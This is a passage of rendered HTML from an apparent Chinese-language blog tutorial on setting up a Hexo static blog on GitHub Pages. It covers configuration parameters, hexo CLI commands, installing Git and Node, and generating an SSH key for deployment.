d</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"打开-https-githubname-github-io-查看你的博客吧！\"><a href=\"#打开-https-githubname-github-io-查看你的博客吧！\" class=\"headerlink\" title=\"打开 https://githubname.github.io/ ,查看你的博客吧！\"></a>打开 <strong><a href=\"https://githubname.github.io/\">https://githubname.github.io/</a></strong> ,查看你的博客吧！</h2><h1 id=\"关于-Hexo-的详细配置\"><a href=\"#关于-Hexo-的详细配置\" class=\"headerlink\" title=\"关于 Hexo 的详细配置\"></a>关于 Hexo 的详细配置</h1><h2 id=\"配置信息-config-yml\"><a href=\"#配置信息-config-yml\" class=\"headerlink\" title=\"配置信息 _config.yml\"></a>配置信息 _config.yml</h2><h4 id=\"Site（网站）\"><a href=\"#Site（网站）\" class=\"headerlink\" title=\"Site（网站）\"></a>Site（网站）</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>title</td>\n<td align=\"left\">网站标题</td>\n</tr>\n<tr>\n<td>subtitle</td>\n<td align=\"left\">网站副标题</td>\n</tr>\n<tr>\n<td>description</td>\n<td align=\"left\">网站描述，description 主要用于 SEO</td>\n</tr>\n<tr>\n<td>keywords</td>\n<td align=\"left\">关键字</td>\n</tr>\n<tr>\n<td>author</td>\n<td align=\"left\">你的名字</td>\n</tr>\n<tr>\n<td>language</td>\n<td align=\"left\">网站使用的语言</td>\n</tr>\n<tr>\n<td>timezone</td>\n<td align=\"left\">网站时区，默认是你电脑的时区</td>\n</tr>\n</tbody></table>\n<h4 id=\"URL-网址\"><a href=\"#URL-网址\" class=\"headerlink\" title=\"URL(网址)\"></a>URL(网址)</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>url</td>\n<td align=\"left\">网址</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td>root</td>\n<td align=\"left\">网站根目录</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td>permalink</td>\n<td align=\"left\">文章的永久链接格式</td>\n<td align=\"left\">:year/:month/:day/:title/</td>\n</tr>\n<tr>\n<td>permalink_defaults</td>\n<td align=\"left\">永久链接中各部分的默认值</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<h5 id=\"网站存放在子目录\"><a href=\"#网站存放在子目录\" class=\"headerlink\" title=\"网站存放在子目录\"></a>网站存放在子目录</h5><p>如果你的网站存放在子目录中：<a href=\"http://yoursite.com/blog%EF%BC%8C%E5%88%99%EF%BC%9A\">http://yoursite.com/blog，则：</a><br>url：<a href=\"http://yoursite.com/blog\">http://yoursite.com/blog</a><br>root：/blog/</p>\n<h4 id=\"Directory-目录\"><a href=\"#Directory-目录\" class=\"headerlink\" title=\"Directory(目录)\"></a>Directory(目录)</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>source_dir</td>\n<td align=\"left\">资源文件夹，这个文件夹用来存放内容</td>\n<td align=\"left\">source</td>\n</tr>\n<tr>\n<td>public_dir</td>\n<td align=\"left\">公共文件夹，这个文件夹用于存放生成的站点文件</td>\n<td align=\"left\">public</td>\n</tr>\n<tr>\n<td>tag_dir</td>\n<td align=\"left\">标签文件夹</td>\n<td align=\"left\">tags</td>\n</tr>\n<tr>\n<td>archive_dir</td>\n<td align=\"left\">归档文件夹</td>\n<td align=\"left\">archives</td>\n</tr>\n<tr>\n<td>category_dir</td>\n<td align=\"left\">分类文件夹</td>\n<td align=\"left\">categories</td>\n</tr>\n<tr>\n<td>code_dir</td>\n<td align=\"left\">Include code 文件夹</td>\n<td align=\"left\">downloads/code</td>\n</tr>\n<tr>\n<td>i18n_dir</td>\n<td align=\"left\">国际化文件夹</td>\n<td align=\"left\">:lang</td>\n</tr>\n<tr>\n<td>skip_render</td>\n<td align=\"left\">跳过指定文件的渲染</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<p>tips：如果您刚刚开始接触 Hexo，通常没有必要修改这一部分的值。</p>\n<h4 id=\"Writing（文章）\"><a href=\"#Writing（文章）\" class=\"headerlink\" title=\"Writing（文章）\"></a>Writing（文章）</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>new_post_name</td>\n<td align=\"left\">新建文章的名称</td>\n<td align=\"left\">:title.md</td>\n</tr>\n<tr>\n<td>default_layout</td>\n<td align=\"left\">预设布局</td>\n<td align=\"left\">post</td>\n</tr>\n<tr>\n<td>auto_spacing</td>\n<td align=\"left\">在中文和英文之间加入空格</td>\n<td align=\"left\">false</td>\n</tr>\n<tr>\n<td>titlecase</td>\n<td align=\"left\">把标题转为 title case</td>\n<td align=\"left\">false</td>\n</tr>\n<tr>\n<td>external_link</td>\n<td align=\"left\">在新标签中打开链接</td>\n<td align=\"left\">true</td>\n</tr>\n<tr>\n<td>filename_case</td>\n<td align=\"left\">把文件名称转换为小写(1)或者大写(2)</td>\n<td align=\"left\">0</td>\n</tr>\n<tr>\n<td>render_drafts</td>\n<td align=\"left\">显示草稿</td>\n<td align=\"left\">false</td>\n</tr>\n<tr>\n<td>post_asset_folder</td>\n<td align=\"left\">启动 Asset 文件夹</td>\n<td align=\"left\">true</td>\n</tr>\n<tr>\n<td>relative_link</td>\n<td align=\"left\">把链接改为与根目录的相对位址</td>\n<td align=\"left\">false</td>\n</tr>\n<tr>\n<td>future</td>\n<td align=\"left\">现实未来的文章</td>\n<td align=\"left\">true</td>\n</tr>\n<tr>\n<td>highlight</td>\n<td align=\"left\">代码块的设置</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<h4 id=\"Category-amp-Tag（分类-amp-标签）\"><a href=\"#Category-amp-Tag（分类-amp-标签）\" class=\"headerlink\" title=\"Category &amp; Tag（分类&amp;标签）\"></a>Category &amp; Tag（分类&amp;标签）</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>default_category</td>\n<td align=\"left\">默认分类</td>\n<td align=\"left\">uncategorized</td>\n</tr>\n<tr>\n<td>category_map</td>\n<td align=\"left\">分类别名</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td>tag_map</td>\n<td align=\"left\">标签别名</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<h4 id=\"Date-Time-format\"><a href=\"#Date-Time-format\" class=\"headerlink\" title=\"Date / Time format\"></a>Date / Time format</h4><p>Hexo 使用 Moment.js 来解析和显示时间。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>date_format</td>\n<td align=\"left\">日期格式</td>\n<td align=\"left\">YYYY-MM-DD</td>\n</tr>\n<tr>\n<td>time_format</td>\n<td align=\"left\">时间格式</td>\n<td align=\"left\">HH:mm:ss</td>\n</tr>\n</tbody></table>\n<h4 id=\"Pagination（分页）\"><a href=\"#Pagination（分页）\" class=\"headerlink\" title=\"Pagination（分页）\"></a>Pagination（分页）</h4><table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>per_page</td>\n<td align=\"left\">每页显示的文章量 (0 = 关闭分页功能)</td>\n<td align=\"left\">10</td>\n</tr>\n<tr>\n<td>pagination_dir</td>\n<td align=\"left\">分页目录</td>\n<td align=\"left\">page</td>\n</tr>\n</tbody></table>\n<h4 id=\"Extensions（扩展）\"><a href=\"#Extensions（扩展）\" class=\"headerlink\" title=\"Extensions（扩展）\"></a>Extensions（扩展）</h4><p><a href=\"https://hexo.io/plugins/\">Plugins</a><br><a href=\"https://hexo.io/themes/\">Themes</a></p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n<th align=\"left\">默认值</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>theme</td>\n<td align=\"left\">当前主题，值为 false 时禁用主题</td>\n<td align=\"left\">landscape</td>\n</tr>\n</tbody></table>\n<h4 id=\"Deployment\"><a href=\"#Deployment\" class=\"headerlink\" title=\"Deployment\"></a>Deployment</h4><p><a href=\"https://hexo.io/docs/deployment.html\">Docs</a></p>\n<p>├──deploy //配置<br>│ ├──type: git //类型<br>│ ├──repo: <a href=\"mailto:&#103;&#x69;&#116;&#x40;&#103;&#105;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#x6d;\">&#103;&#x69;&#116;&#x40;&#103;&#105;&#116;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#x6d;</a>:githubname/githubname.github.io.git //新建仓库地址,注意 githubname 是你的 github 名称<br>│ ├──branch: master //分支</p>\n<h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><ul>\n<li><strong>init</strong> 新建一个网站</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo init &lt;folder&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如果没有设置文件夹，hexo 默认在当前文件夹新建</p>\n<ul>\n<li><strong>new</strong> 新建一篇文章</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。默认是 post，如果标题包含空格的话，请使用引号括起来。</p>\n<ul>\n<li><p>布局（Layout）<br>hexo 三种默认布局：post、page、draft</p>\n<table>\n<thead>\n<tr>\n<th>布局</th>\n<th align=\"left\">路径</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>post</td>\n<td align=\"left\">source/_posts</td>\n</tr>\n<tr>\n<td>page</td>\n<td align=\"left\">source</td>\n</tr>\n<tr>\n<td>draft</td>\n<td align=\"left\">source/_drafts</td>\n</tr>\n</tbody></table>\n</li>\n<li><p>文件名称（title）<br>Hexo 默认以标题做为文件名称，但您可编辑 new_post_name 参数来改变默认的文件名称，举例来说，设为 :year-:month-:day-:title.md 可让您更方便的通过日期来管理文章。</p>\n<table>\n<thead>\n<tr>\n<th>变量</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>:title</td>\n<td align=\"left\">标题（小写，空格将会被替换为短杠）</td>\n</tr>\n<tr>\n<td>:year</td>\n<td align=\"left\">建立的年份，比如， 2015</td>\n</tr>\n<tr>\n<td>:month</td>\n<td align=\"left\">建立的月份（有前导零），比如， 04</td>\n</tr>\n<tr>\n<td>:i_month</td>\n<td align=\"left\">建立的月份（无前导零），比如， 4</td>\n</tr>\n<tr>\n<td>:day</td>\n<td align=\"left\">建立的日期（有前导零），比如， 07</td>\n</tr>\n<tr>\n<td>:i_day</td>\n<td align=\"left\">建立的日期（无前导零），比如， 7</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<ul>\n<li><strong>generate</strong> 生成静态文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>也可以简写为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-d,–deploy</td>\n<td align=\"left\">文件生成后立即部署网站</td>\n</tr>\n<tr>\n<td>-w，–watch</td>\n<td align=\"left\">监视文件变动</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g -d</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g -w</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>publish</strong> 发布草稿</li>\n</ul>\n<p>通过 publish 命令将草稿移动到 source/_posts 文件夹，该命令的使用方式与 new 十分类似，您也可在命令中指定 layout 来指定布局</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo publish [layout] &lt;filename&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>server</strong> 启动服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-p，–port</td>\n<td align=\"left\">重设端口</td>\n</tr>\n<tr>\n<td>-s,–static</td>\n<td align=\"left\">只使用静态文件</td>\n</tr>\n<tr>\n<td>-l,–log</td>\n<td align=\"left\">启动日志记录，使用覆盖记录格式</td>\n</tr>\n</tbody></table>\n<ul>\n<li><strong>deploy</strong> 部署网站</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>也可以简写为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-g, –generate</td>\n<td align=\"left\">部署之前预先生成静态文件</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d -g</span><br></pre></td></tr></table></figure>\n\n<p>注意两者区别：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g -d // 文件生成后立即部署网站(新生成的文件)</span><br><span class=\"line\">$ hexo d -g // 部署之前预先生成静态文件(之前已经生成的文件)</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>render</strong> 渲染文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>-o, –output</td>\n<td align=\"left\">设置输出路径</td>\n</tr>\n</tbody></table>\n<ul>\n<li>migrate 从其他博客系统</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo migrate &lt;type&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>clean</strong> 清除缓存文件</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo clean</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>list</strong> 列出网站资料。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo list &lt;type&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>version</strong> 显示 Hexo 版本。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo version</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>安全模式</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --safe</span><br></pre></td></tr></table></figure>\n\n<p>在安全模式下，不会载入插件和脚本。当您在安装新插件遭遇问题时，可以尝试以安全模式重新执行。</p>\n<ul>\n<li><strong>调试模式</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --debug</span><br></pre></td></tr></table></figure>\n\n<p>在终端中显示调试信息并记录到 debug.log。当您碰到问题时，可以尝试用调试模式重新执行一次，并 提交调试信息到 GitHub。</p>\n<ul>\n<li><strong>简洁模式</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --silent</span><br></pre></td></tr></table></figure>\n\n<p>隐藏终端信息。</p>\n<ul>\n<li><strong>自定义配置文件的路径</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --config custom.yml</span><br></pre></td></tr></table></figure>\n\n<p>自定义配置文件的路径，执行后将不再使用 _config.yml。</p>\n<ul>\n<li><strong>显示草稿</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --draft</span><br></pre></td></tr></table></figure>\n\n<p>显示 source/_drafts 文件夹中的草稿文章。</p>\n<ul>\n<li><strong>自定义 CWD</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo --cwd /path/to/cwd</span><br></pre></td></tr></table></figure>\n\n<p>自定义当前工作目录（Current working directory）的路径。</p>\n<h3 id=\"Scaffold（模板）\"><a href=\"#Scaffold（模板）\" class=\"headerlink\" title=\"Scaffold（模板）\"></a>Scaffold（模板）</h3><p>在新建文章时，Hexo 会根据 scaffolds 文件夹内相对应的文件来建立文件，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new photo &quot;My Gallery&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在执行这行指令时，Hexo 会尝试在 scaffolds 文件夹中寻找 photo.md，并根据其内容建立文章，</p>\n<p>新建文章模板</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new post &quot;My Gallery&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>新建分页模板</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new page &quot;My Gallery&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>新建草稿模板</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new draft &quot;My Gallery&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>以下是你可以在模版中使用的变量：</p>\n<table>\n<thead>\n<tr>\n<th>变量</th>\n<th align=\"left\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>layout</td>\n<td align=\"left\">布局</td>\n</tr>\n<tr>\n<td>title</td>\n<td align=\"left\">标题</td>\n</tr>\n<tr>\n<td>date</td>\n<td align=\"left\">文件建立日期</td>\n</tr>\n</tbody></table>\n<h2 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"安装依赖环境\"><a href=\"#安装依赖环境\" class=\"headerlink\" title=\"安装依赖环境\"></a>安装依赖环境</h2><p><a href=\"https://git-scm.com/downloads\">Git:https://git-scm.com/downloads</a><br><a href=\"https://nodejs.org/en/download/\">Node:https://nodejs.org/en/download/</a></p>\n<h3 id=\"如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用-npm-即可完成-Hexo-的安装。\"><a href=\"#如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用-npm-即可完成-Hexo-的安装。\" class=\"headerlink\" title=\"如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。\"></a>如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。</h3><ul>\n<li>安装 Hexo</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install -g hexo-cli</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><ul>\n<li>安装 Git<br>下载并安装 <a href=\"https://git-scm.com/downloads\">Git</a>.</li>\n<li>安装 Node<br>下载并安装 <a href=\"https://nodejs.org/en/download/\">Node</a><ul>\n<li>检查是否安装成功</li>\n</ul>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ node -v</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/node_v.png\" alt=\"node_v\"></p>\n<ul>\n<li>安装 Hexo</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install -g hexo-cli</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>检查是否安装成功</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo -v</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/-v.png\" alt=\"hexo_v\"></p>\n<h2 id=\"创建-Hexo\"><a href=\"#创建-Hexo\" class=\"headerlink\" title=\"创建 Hexo\"></a>创建 Hexo</h2><ul>\n<li>新建文件夹并初始化</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo init &lt;folder&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>进入文件夹</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd &lt;folder&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>安装依赖</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装完成，项目结构目录如下\"><a href=\"#安装完成，项目结构目录如下\" class=\"headerlink\" title=\"安装完成，项目结构目录如下\"></a>安装完成，项目结构目录如下</h3><p>├── _config.yml // 网站的配置信息<br>├── package.json // 应用程序信息<br>├── scaffolds // 模板文件夹<br>├── source // 存放用户资源<br>│ ├── _drafts<br>│ ├── _post<br>└── themes // 主题</p>\n<ul>\n<li>创建</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在服务端打开</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/server.png\" alt=\"server\"><br>你就可以查看你的 hexo 了，默认端口 4000，<a href=\"http://localhost:4000/\">http://localhost:4000</a></p>\n<h2 id=\"新建-git-仓库项目\"><a href=\"#新建-git-仓库项目\" class=\"headerlink\" title=\"新建 git 仓库项目\"></a>新建 git 仓库项目</h2><p>Github 账户注册和新建项目</p>\n<ul>\n<li>新建<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/new.png\" alt=\"new\"></li>\n<li>项目名称格式： <strong>githubname</strong>.github.io,如：zhangsan.github.io<br><em>注意：</em>一定要是你注册 github 的用户名+github.io<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/create_new_repo.png\" alt=\"create_new_repo\"></li>\n<li>Github Pages<br>选择 settings，下拉至 Github Pages，你就发现你刚才新建的项目已经部署到网上了，可以直接访问<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/github_pages.png\" alt=\"github_pages\"></li>\n</ul>\n<h2 id=\"将-git-仓库与-hexo-关联起来\"><a href=\"#将-git-仓库与-hexo-关联起来\" class=\"headerlink\" title=\"将 git 仓库与 hexo 关联起来\"></a>将 git 仓库与 hexo 关联起来</h2><p>在所在文件夹 打开 Git Bash</p>\n<ul>\n<li>设置你的 github 用户名和邮箱</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name &quot;github_name&quot;</span><br><span class=\"line\">$ git config --global user.emil &quot;github_emil&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">//你的github注册名和注册邮箱</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/emil.png\" alt=\"emil\"></p>\n<ul>\n<li>检查是否存在 ssh key</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cd ~/.ssh</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>如果已经存在，可可以看见该.ssh 文件夹<br><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/ssh_folder.png\" alt=\"ssh_folder\"></li>\n<li>如果没有则需要去生成</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh-keygen -t rsa -C &quot;github_emil&quot;</span><br><span class=\"line\">// 三次回车，就会生成key</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Hexo-Github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/key.png\" alt=\"key\"></p>\n<ul>\n<li>进入.ssh 